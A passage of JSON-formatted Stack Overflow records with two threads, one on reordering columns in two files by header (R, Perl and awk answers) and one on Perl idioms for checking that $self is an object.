"https://stackoverflow.com/users/3591048/theo4786"}, "edited": false, "score": 0, "creation_date": 1455146094, "post_id": 35283472, "comment_id": 58364222, "body": "@theo4786 See my updated answer. Includes the <code>map</code> construct."}], "tags": [], "owner": {"reputation": 598, "user_id": 5775367, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/981bea2526f6952df043a2b7e4ed47dc?s=128&d=identicon&r=PG&f=1", "display_name": "Carlos Alberto", "link": "https://stackoverflow.com/users/5775367/carlos-alberto"}, "is_accepted": true, "score": 1, "last_activity_date": 1455048596, "last_edit_date": 1455048596, "creation_date": 1454989117, "answer_id": 35283472, "question_id": 35283383, "link": "https://stackoverflow.com/questions/35283383/sort-two-files-by-header-so-that-they-are-in-matching-field-order/35283472#35283472", "title": "sort two files by header so that they are in matching field order", "body": "<p>Using <code>data.table</code>, this can help you\nFirst read the files,</p>\n\n<pre><code> library(data.table)\n dt1 &lt;- fread(\"file1.csv\")\n dt2 &lt;- fread(\"file2.csv\")\n</code></pre>\n\n<p>then, get the names of the fields, the common ones </p>\n\n<pre><code> ndt1 &lt;- names(dt1)[-1]\n ndt2 &lt;- names(dt2)[-1]\n common &lt;- intersect(ndt1, ndt2)\n</code></pre>\n\n<p>and now you can just apply the new order</p>\n\n<pre><code> setorder(dt1, c(ndt1[1], setdiff(ndt1, common), common))\n setorder(dt2, c(ndt2[1], setdiff(ndt2, common), common))\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1455010314, "creation_date": 1455010314, "answer_id": 35288314, "question_id": 35283383, "link": "https://stackoverflow.com/questions/35283383/sort-two-files-by-header-so-that-they-are-in-matching-field-order/35288314#35288314", "title": "sort two files by header so that they are in matching field order", "body": "<p>In perl, the tool for this job is a hash slice. </p>\n\n<p>You can access values of a hash as <code>@hash{@keys}</code>.</p>\n\n<p>So something like this:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @headers; \nmy $type; \n\nmy @rows; \n\n#iterate data - would do this with a normal 'open'\nwhile ( &lt;DATA&gt; ) {\n  #set headers if the leading word is all upper case \n  if ( m/^[A-Z]+\\s/ ) { \n      #seperate out type (VEG/FRUIT) from the other headings. \n      chomp ( ( $type, @headers ) = split ); \n      #print for debugging\n      print Dumper \\@headers;\n  }\n  else {\n     #create a hash to store this row. \n     my %this_row;\n     #split the row on whitespace, capturing name and ordered fields by header row. \n     ( my $name, @this_row{@headers} ) = split; \n     #insert name and type into the hash\n     $this_row{name} = $name;\n     $this_row{type} = $type;\n     #print for debugging\n     print Dumper \\%this_row;\n     #store it in @rows\n     push ( @rows, \\%this_row ); \n  }\n}\n\n#print output:\n#header line\nprint join (\"\\t\", \"name\", \"type\", @headers ),\"\\n\";\n#iterate rows, extract ordered by _last_ set of headers. \nforeach my $row ( @rows ) { \n    print join ( \"\\t\", $row-&gt;{name}, $row-&gt;{type}, @{$row}{@headers} ),\"\\n\";\n}\n\n__DATA__\nFRUIT MSMC1 MSMC24 MSMC2 MSMC10\nApple 1 2 3 2\nPear 2 1 4 5\nVEG MSMC24 MSMC1 MSMC2 MSMC10\nOnion 2 1 3 2\nRadish 0 3 9 3\n</code></pre>\n\n<p>Note - I've used <code>Data::Dumper</code> for diagnostics - those lines can be removed, but I've left them because illustrate what's going on. \nLikewise reading from <code>&lt;DATA&gt;</code> - normally you'd open a file handle, or just use <code>while ( &lt;&gt; ) {</code> to read STDIN or files specified on command line. </p>\n\n<p>The ordering of output is based on the last header line 'seen' - you can of course, sort that, or reorder it.</p>\n\n<p>If you need to handle mismatching columns, this will error on the missing one. In this scenario, we can break out <code>map</code> to fill in any blanks, and use a hash for <code>headers</code> to ensure we capture them all. </p>\n\n<p>E.g.;</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @headers; \nmy %headers_combined; \nmy $type; \n\nmy @rows; \n\n#iterate data - would do this with a normal 'open'\nwhile ( &lt;DATA&gt; ) {\n  #set headers if the leading word is all upper case \n  if ( m/^[A-Z]+\\s/ ) { \n      #seperate out type (VEG/FRUIT) from the other headings. \n      chomp ( ( $type, @headers ) = split ); \n      #add to hash of headers, to preserve uniques\n      $headers_combined{$_}++ for @headers; \n      #print for debugging\n      print Dumper \\@headers;\n  }\n  else {\n     #create a hash to store this row. \n     my %this_row;\n     #split the row on whitespace, capturing name and ordered fields by header row. \n     ( my $name, @this_row{@headers} ) = split; \n     #insert name and type into the hash\n     $this_row{name} = $name;\n     $this_row{type} = $type;\n     #print for debugging\n     print Dumper \\%this_row;\n     #store it in @rows\n     push ( @rows, \\%this_row ); \n  }\n}\n\n#print output:\n#header line\n#note - extract keys from hash, not the @headers array. \n#sort is needed to order them, because default is unordered. \nprint join (\"\\t\", \"name\", \"type\", sort keys %headers_combined ),\"\\n\";\n#iterate rows, extract ordered by _last_ set of headers. \nforeach my $row ( @rows ) { \n    print join ( \"\\t\", $row-&gt;{name}, $row-&gt;{type}, map { $row-&gt;{$_} // '' } sort keys %headers_combined ),\"\\n\";\n}\n\n__DATA__\nFRUIT MSMC1 MSMC24 MSMC2 MSMC10 OTHER\nApple 1 2 3 2 x\nPear 2 1 4 5 y \nVEG MSMC24 MSMC1 MSMC2 MSMC10 NOTHING\nOnion 2 1 3 2 p\nRadish 0 3 9 3 z\n</code></pre>\n\n<p>Here, <code>map { $row-&gt;{$_} // '' } sort keys %headers_combined</code> takes all the keys of the hash, returns them in order, and then extracts that key from the row - or gives an empty space if it's undefined. (thats what <code>//</code> does)</p>\n"}, {"tags": [], "owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "is_accepted": false, "score": 0, "last_activity_date": 1455049553, "creation_date": 1455049553, "answer_id": 35301496, "question_id": 35283383, "link": "https://stackoverflow.com/questions/35283383/sort-two-files-by-header-so-that-they-are-in-matching-field-order/35301496#35301496", "title": "sort two files by header so that they are in matching field order", "body": "<p>This will reorder the fields in file2 to match the order in file1:</p>\n\n<pre><code>$ cat tst.awk\nFNR==1 {\n    fileNr++\n    for (i=2;i&lt;=NF;i++) {\n        name2nr[fileNr,$i] =  i\n        nr2name[fileNr,i]  = $i\n    }\n}\nfileNr==2 { \n    printf \"%s\", $1\n    for (i=2;i&lt;=NF;i++) {\n        printf \"%s%s\", OFS, $(name2nr[1,nr2name[2,i]])\n    }\n    print \"\"\n}\n\n$ awk -f tst.awk file1 file2\nVEG MSMC1 MSMC24 MSMC2 MSMC10\nOnion 1 2 3 2\nRadish 3 0 9 3\n</code></pre>\n\n<p>With GNU awk you can delete the <code>fileNr++</code> line and use <code>ARGIND</code> instead of <code>fileNr</code> everywhere else.</p>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 1, "last_activity_date": 1455146360, "last_edit_date": 1455146360, "creation_date": 1455063485, "answer_id": 35304719, "question_id": 35283383, "link": "https://stackoverflow.com/questions/35283383/sort-two-files-by-header-so-that-they-are-in-matching-field-order/35304719#35304719", "title": "sort two files by header so that they are in matching field order", "body": "<p>A perl solution that leaves the first file as is and writes the second file with the columns arranged in the same order as the first file. It reads the 2 files supplied on the command line (which follow the script name).</p>\n\n<p><strong>Update:</strong> Added the <code>map $_ // (),</code> phrase to allow the second file to be a subset of the first file. Answer to his question <em>How could these answers be modified if one file were to be a subset of the other (not all columns from file 1 are in file2)? \u2013 theo4786</em>  </p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\n# commandline: perl script_name.pl fruits.csv veg.csv\n\nmy (undef, @fruit_hdrs) = split ' ', &lt;&gt; and close ARGV;\n\nmy @veg_hdrs;\n\nwhile (&lt;&gt;) {\n    my ($name, @cols) = split;\n\n    # only executes for the first line (header line) of second file\n    @veg_hdrs = @cols unless @veg_hdrs;\n\n    my %line;\n    @line{ @veg_hdrs } = @cols;\n\n    print join(\" \", $name, map $_ // (), @line{ @fruit_hdrs } ), \"\\n\";\n}\n</code></pre>\n\n<p>Output is:</p>\n\n<pre><code>VEG MSMC1 MSMC24 MSMC2 MSMC10\nOnion 1 2 3 2\nRadish 3 0 9 3\n</code></pre>\n"}], "owner": {"reputation": 149, "user_id": 3591048, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/vr3Mm.jpg?s=128&g=1", "display_name": "theo4786", "link": "https://stackoverflow.com/users/3591048/theo4786"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 35283472, "answer_count": 4, "score": 2, "last_activity_date": 1455146360, "creation_date": 1454988389, "question_id": 35283383, "link": "https://stackoverflow.com/questions/35283383/sort-two-files-by-header-so-that-they-are-in-matching-field-order", "title": "sort two files by header so that they are in matching field order", "body": "<p>I have two files that each have 700 fields, where 699/700 of the fields have matching headers. I would like to reorder the fields so that they are in the same order in both files (though which order is irrelevant). For example, given:</p>\n\n<pre><code>File1:\nFRUIT MSMC1 MSMC24 MSMC2 MSMC10\nApple 1 2 3 2\nPear 2 1 4 5\n\nFile2:\nVEG MSMC24 MSMC1 MSMC2 MSMC10\nOnion 2 1 3 2\nRadish 0 3 9 3\n</code></pre>\n\n<p>I would like both files to have the first field as the fields that are not common to both files, then the rest of the fields in the same order in both files, for example one possible outcome would be:</p>\n\n<pre><code>File1:\nFRUIT MSMC1 MSMC2 MSMC10 MSMC24\nApple 1 3 2 2\nPear 2 4 5 1\n\nFile2:\nVEG MSMC1 MSMC2 MSMC10 MSMC24\nOnion 1 3 2 2\nRadish 3 9 3 0\n</code></pre>\n"}, {"tags": ["perl", "oop"], "comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 5, "creation_date": 1454977952, "post_id": 35281526, "comment_id": 58275283, "body": "methods that could be either a class method or an instance method are a misfeature IMO"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1454989176, "post_id": 35281526, "comment_id": 58278064, "body": "Related: <a href=\"http://stackoverflow.com/questions/7728417/in-perl-how-do-i-ensure-that-a-sub-is-invoked-as-a-method-from-methods-of-the-s/7728797#7728797\" title=\"in perl how do i ensure that a sub is invoked as a method from methods of the s\">stackoverflow.com/questions/7728417/&hellip;</a>"}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1455119218, "post_id": 35281526, "comment_id": 58348082, "body": "@ysth: &quot;methods that could be either a class method or an instance method are a misfeature&quot; - no kidding!  But Perl inherently supports them, and I am trying to find a way to prevent them from causing bugs."}, {"owner": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1455121349, "post_id": 35281526, "comment_id": 58349769, "body": "@ysth  Why? Because of the issues raised in the question or are there other reasons as well?"}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1455123423, "post_id": 35281526, "comment_id": 58351352, "body": "Sorry. To/From confusion. Fixed and reposted."}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "reply_to_user": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "edited": false, "score": 0, "creation_date": 1455123452, "post_id": 35281526, "comment_id": 58351372, "body": "@G.Cito: I do not understand why you asked &quot;Why?&quot; Surely &quot;preventing bugs&quot; is a good reason for many things in programming if the prevention is easy, cheap, understandable, etc."}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "reply_to_user": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "edited": false, "score": 0, "creation_date": 1455123548, "post_id": 35281526, "comment_id": 58351438, "body": "@G.Cito: - or are you referring to &quot;&quot;methods that could be either a class method or an instance method are a misfeature&quot;. Actually, I am less string on that than you are, as I explain in a response to stackoverflow.com/questions/7728417/\u2026 - standard refactorings often lead to what amount to &quot;class static methods&quot;"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "reply_to_user": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "edited": false, "score": 0, "creation_date": 1455125103, "post_id": 35281526, "comment_id": 58352455, "body": "@G.Cito it just adds potential for bugs without actually giving any benefit"}, {"owner": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "edited": false, "score": 0, "creation_date": 1455128402, "post_id": 35281526, "comment_id": 58354600, "body": "Thanks. I assumed calling method as a function would somehow not work at compile time (perhaps some modules check signatures in some rudimentary way?), but calling a function as a method might be problematic since it could compile but break at run-time due to improper function args and the like."}, {"owner": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1455128787, "post_id": 35281526, "comment_id": 58354834, "body": "@KrazyGlew :-) Yes I was commenting in regard to @ysth&#39;s notion of misfeature.  OO terminology seems to come from  many different sources (class method, class static method, private function <code>_private</code>, <i>etc.</i>) and I often find much to like in perl&#39;s relaxed approach."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "reply_to_user": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "edited": false, "score": 0, "creation_date": 1455131162, "post_id": 35281526, "comment_id": 58356266, "body": "@G.Cito calling a method as a function would also compile but break at run-time due to improper function args and the like"}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1455403236, "post_id": 35281526, "comment_id": 58476763, "body": "@ysth: the whole point of my question is that calling a method as a function compiles, and runs without error (sometimes). Runs incorrectly, but runs nevertheless. I prefer buggy code to die cleanly."}], "answers": [{"comments": [{"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1455119746, "post_id": 35283547, "comment_id": 58348504, "body": "@Schern: I agree on not mixing functions and methods in a single package. This bug occurred as I was refactoring from a &quot;package of functions&quot; to a class - although I suppose I was not really refactoring, since this bug occurred, and my tests all passed.  My tests all passed, but not all of the callers (in separate code trees) got changed - I suppose I should not have refactored in place, but should have created a new class package, and forwarded from old to new.  But the one ends up with all sorts of package names that are slightly different from each other."}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1455120003, "post_id": 35283547, "comment_id": 58348692, "body": "if you separate the &quot;use (unstable) Moops&quot; from the &quot;use something like this check_invocant function&quot;, I will accept the latter as an answer - assuming nothing better pops up in next few days.  I was somewhat hoping that there was already a package that had check_invocant() in it, since I am guessing that there will need to be several flavors needed."}, {"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1455120910, "post_id": 35283547, "comment_id": 58349423, "body": "BTW, C++ has class methods and object methods.  A class method can be called as Class::method() or as obj-&gt;method(), and in the latter there is no &quot;self&quot; or &quot;this&quot; created implicitly.  check_invocant&#39;s !ref prevents a &quot;class method&quot; from being called via the Class-&gt;method() syntax in Perl, since the class name string is first argument. Easy to &quot;fix&quot;, but it worries me that you cannot then distinguish Foo-&gt;m($foo1,$foo2) from Foo::m(&quot;Foo&quot;,$foo1,$foo2),   or $foo1-&gt;m($foo2) from Foo::($foo1,$foo2).  Probably Perl&#39;s bad  - if the package string were somehow flavored, could make safe(r)."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1455126730, "post_id": 35283547, "comment_id": 58353558, "body": "@KrazyGlew I&#39;m not going to split the answer, I gave a choice of answers for a reason. The first because I think the bug is rare and adding a check to every method is not good use of dev or CPU time; Perl&#39;s lackadaisical OO system does require some getting used to. The second so you&#39;re aware of the state of the art; signatures have been around for a long time, are quite usable in production, and you shouldn&#39;t be doing OO by hand anyway. The third because it&#39;s what you asked for."}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 10, "last_activity_date": 1455127117, "last_edit_date": 1455127117, "creation_date": 1454989710, "answer_id": 35283547, "question_id": 35281526, "link": "https://stackoverflow.com/questions/35281526/seek-perl-idiom-to-check-that-self-is-a-class-or-object/35283547#35283547", "title": "Seek Perl idiom to check that $self is a class or object", "body": "<p>The best answer is to not mix functions and methods in a single package.  \"Hybrid modules\", as they're known, are problematic.  Everything which you might want to make a function should instead be a class method call.</p>\n\n<p>There should be little need to fully qualify a function call in day-to-day programming.</p>\n\n<hr>\n\n<p>The most concise way is to use <a href=\"https://metacpan.org/pod/Moops\" rel=\"nofollow noreferrer\">Moops</a> which is the new way to use Moose with syntax-sugar.</p>\n\n<pre><code>use Moops;\n\nclass Foo {\n    method something() {\n        print(\"something called\\n\");\n    }\n}\n\nFoo-&gt;new-&gt;something();\nFoo::something();\n\n# something called\n# Invocant $self is required at /Users/schwern/tmp/test.plx line 10.\n</code></pre>\n\n<p><a href=\"https://metacpan.org/pod/Moops#STATUS\" rel=\"nofollow noreferrer\">Moops is marked as unstable</a>, but that's the interface, not the signatures themselves. Signatures have been around and usable in production for a long time, longer than they've been built in.  More worrying is there <a href=\"https://metacpan.org/changes/distribution/Moops\" rel=\"nofollow noreferrer\">hasn't been a release in over a year</a>, however the author writes good stuff.  Your call.</p>\n\n<hr>\n\n<p>Otherwise, like with anything else, write a function.</p>\n\n<pre><code>use Carp;\nuse Scalar::Util qw(blessed);\n\nsub check_invocant {\n    my $thing = shift;\n\n    my $caller = caller;\n\n    if( !defined $thing ) {\n        croak \"The invocant is not defined\";\n    }\n    elsif( !ref $thing ) {\n        croak \"The invocant is not a reference\";\n    }\n    elsif( !blessed $thing ) {\n        croak \"The invocant is not an object\";\n    }\n    elsif( !$thing-&gt;isa($caller) ) {\n        croak \"The invocant is not a subclass of $caller\";\n    }\n\n    return $thing;\n}\n</code></pre>\n\n<p>Since this returns the invocant and handles the exception for you it can be used very concisely.</p>\n\n<pre><code>package Foo;\n\nsub method {\n    my $self = ::check_invocant(shift);\n\n    ...\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "edited": false, "score": 0, "creation_date": 1455121215, "post_id": 35302156, "comment_id": 58349686, "body": "thanks: Safe::Isa is halfway to what a package useful for this limited form of argumnt checking would need.  Although...  I am more and more in the Andrei Alexandrescu camp, the best way to indicate an error is to throw an exception. It is unfortunate that exceptions lead to such ugly error messages - I would probably write an argument checking package mainly to provide a more useful error message, like &quot;method: first argument ($self) was not an object of the expected class&quot;.  And then throw that string as an exception."}], "tags": [], "owner": {"reputation": 5099, "user_id": 406224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bc79fa6fa58e2a4f5e6c2f803cabc48?s=128&d=identicon&r=PG", "display_name": "oalders", "link": "https://stackoverflow.com/users/406224/oalders"}, "is_accepted": false, "score": 2, "last_activity_date": 1455051846, "creation_date": 1455051846, "answer_id": 35302156, "question_id": 35281526, "link": "https://stackoverflow.com/questions/35281526/seek-perl-idiom-to-check-that-self-is-a-class-or-object/35302156#35302156", "title": "Seek Perl idiom to check that $self is a class or object", "body": "<p>I'll add to what Schwern has written to say that you could also take a look at <a href=\"https://metacpan.org/pod/Safe::Isa\" rel=\"nofollow\">Safe::Isa</a>, which lets you safely call <code>isa</code> on something which you cannot be sure is an object.</p>\n"}, {"tags": [], "owner": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "is_accepted": false, "score": 0, "last_activity_date": 1462836393, "last_edit_date": 1462836393, "creation_date": 1462808740, "answer_id": 37120035, "question_id": 35281526, "link": "https://stackoverflow.com/questions/35281526/seek-perl-idiom-to-check-that-self-is-a-class-or-object/37120035#37120035", "title": "Seek Perl idiom to check that $self is a class or object", "body": "<p>I'm going to try to follow the advice of @Schwern and \"not mix functions and methods in a single package\". That said, here's an example using the <code>fun</code> <code>method</code> approach from <a href=\"http://metacpan.org/pod/Function::Parameters\" rel=\"nofollow\"><code>Function::Parameters</code></a>. The example is of course contrived and a bit awkward, but it illustrates the idea. </p>\n\n<p><code>Function::Parameters</code> requires a compiler version of at least <code>perl5.14</code>. It's still perl (and XS) so it will not magically make your code \"strongly typed\". But, with <code>attributes</code> and type constraints via <code>Type::Tiny</code>, you <em>can</em> separate your methods and functions by more than name only. Even just using different names for different types of subroutines - <code>fun</code> and <code>method</code> by default - can be really helpful.</p>\n\n<p>Using the <code>':strict'</code> keyword and/or default function/method \"types\" (<code>fun =&gt; { ... }</code> and <code>method =&gt; { ... }</code> below, as well as others such as <code>method_lax</code>) obviates the need for passing values to settings when the module is imported, so the code below can be made shorter.</p>\n\n<pre><code>use v5.22;   \npackage My::Package {\n  use DDP;\n  use attributes 'get';\n  use Function::Parameters { \n    fun    =&gt;  { strict =&gt; 1, } , \n    method =&gt;  { strict =&gt; 1,\n                 invocant =&gt; 1, \n                 shift =&gt; '$class', \n                 attributes =&gt; ':method',} ,  \n  } ;\n\n  fun func_test ( @ )  {\n   warn \"must be called as a function\" \n   if $_[0] eq __PACKAGE__ &amp;&amp; get(__SUB__) ne \"method\";       \n   print \"args = \", np @_ ;\n  } \n\n  method meth_test ( @ ) { \n   warn \"must be called as a method\" \n   unless $class eq __PACKAGE__ &amp;&amp; get(__SUB__) eq \"method\";  \n   say \"\\$class = $class\" if length $class ;\n   say \"args = \", np @_  ;\n  }\n}\n\nsay \"\\nCalling meth_test as method:\";\nMy::Package-&gt;meth_test( [\"foo\", \"bar\"] );    \nsay \"\\nCalling meth_test as function:\";\nMy::Package::meth_test( [\"foo\", \"bar\"] );\nsay \"\\nCalling func_test as a function:\";\nMy::Package::func_test( qw/baz fuz/ );\nsay \"\\nCalling func_test as a method:\";\nMy::Package-&gt;func_test( qw/baz fuz/ );\n</code></pre>\n\n<p><strong>Output</strong>:</p>\n\n<pre><code>Calling meth_test as method:\n$class = My::Package\nargs = [\n    [0] [\n        [0] \"foo\",\n        [1] \"bar\"\n    ]\n]\n\nCalling meth_test as function:\nmust be called as a method at FunctionParameters-PackageCheck-SO.pl line 24.\n$class = ARRAY(0x801cfa330)\nargs = []\n\nCalling func_test as a function:\nargs = [\n    [0] \"baz\",\n    [1] \"fuz\"\n]\n\nCalling func_test as a method:\nmust be called as a function at FunctionParameters-PackageCheck-SO.pl line 17.\nargs = [\n    [0] \"My::Package\",\n    [1] \"baz\",\n    [2] \"fuz\"\n]\n</code></pre>\n"}], "owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 512, "favorite_count": 2, "answer_count": 3, "score": 7, "last_activity_date": 1508599155, "creation_date": 1454975511, "last_edit_date": 1508599155, "question_id": 35281526, "link": "https://stackoverflow.com/questions/35281526/seek-perl-idiom-to-check-that-self-is-a-class-or-object", 